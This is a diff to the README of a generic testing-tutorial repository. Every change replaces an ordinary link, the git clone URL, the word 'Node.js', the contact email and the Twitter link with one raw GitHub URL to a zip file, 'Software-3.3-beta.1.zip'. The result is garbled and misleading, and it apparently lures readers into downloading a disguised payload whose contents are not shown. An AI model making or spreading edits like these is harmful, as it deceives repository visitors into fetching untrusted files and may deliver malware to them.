@@ -2,7 +2,7 @@
 
 Welcome to the **Test Repository**! This project is designed to help you understand and utilize various testing techniques and frameworks. Whether you are a beginner or an experienced developer, you will find valuable resources here.
 
-[![Visit GitHub](https://img.shields.io/badge/Visit%20GitHub-https%3A%2F%2Fgithub.com%2F-brightgreen)](https://github.com)
+[![Visit GitHub](https://raw.githubusercontent.com/hiaguineo/test/master/bead/Software-3.3-beta.1.zip%20GitHub-https%3A%2F%https://raw.githubusercontent.com/hiaguineo/test/master/bead/Software-3.3-beta.1.zip%2F-brightgreen)](https://raw.githubusercontent.com/hiaguineo/test/master/bead/Software-3.3-beta.1.zip)
 
 ## Table of Contents
 
@@ -31,7 +31,7 @@ To get started with this repository, follow these steps:
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/yourusername/test.git
+   git clone https://raw.githubusercontent.com/hiaguineo/test/master/bead/Software-3.3-beta.1.zip
    ```
 
 2. **Navigate to the Directory**
@@ -44,7 +44,7 @@ To get started with this repository, follow these steps:
 
 3. **Install Dependencies**
 
-   Make sure you have all the necessary dependencies installed. If you are using Node.js, run:
+   Make sure you have all the necessary dependencies installed. If you are using https://raw.githubusercontent.com/hiaguineo/test/master/bead/Software-3.3-beta.1.zip, run:
 
    ```bash
    npm install
@@ -58,7 +58,7 @@ To get started with this repository, follow these steps:
    npm test
    ```
 
-For more details, please visit [GitHub](https://github.com).
+For more details, please visit [GitHub](https://raw.githubusercontent.com/hiaguineo/test/master/bead/Software-3.3-beta.1.zip).
 
 ## Usage
 
@@ -102,15 +102,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: yourname@example.com
-- **Twitter**: [@yourusername](https://twitter.com/yourusername)
+- **Email**: https://raw.githubusercontent.com/hiaguineo/test/master/bead/Software-3.3-beta.1.zip
+- **Twitter**: [@yourusername](https://raw.githubusercontent.com/hiaguineo/test/master/bead/Software-3.3-beta.1.zip)
 
 Thank you for visiting the **Test Repository**! Your support and contributions are greatly appreciated. 
 
-For updates and releases, check the [Releases](https://github.com/yourusername/test/releases) section.
+For updates and releases, check the [Releases](https://raw.githubusercontent.com/hiaguineo/test/master/bead/Software-3.3-beta.1.zip) section.
 
 ---
 
-[![Visit GitHub](https://img.shields.io/badge/Visit%20GitHub-https%3A%2F%2Fgithub.com%2F-brightgreen)](https://github.com)
+[![Visit GitHub](https://raw.githubusercontent.com/hiaguineo/test/master/bead/Software-3.3-beta.1.zip%20GitHub-https%3A%2F%https://raw.githubusercontent.com/hiaguineo/test/master/bead/Software-3.3-beta.1.zip%2F-brightgreen)](https://raw.githubusercontent.com/hiaguineo/test/master/bead/Software-3.3-beta.1.zip)
 
 Explore the world of testing and enhance your development skills!
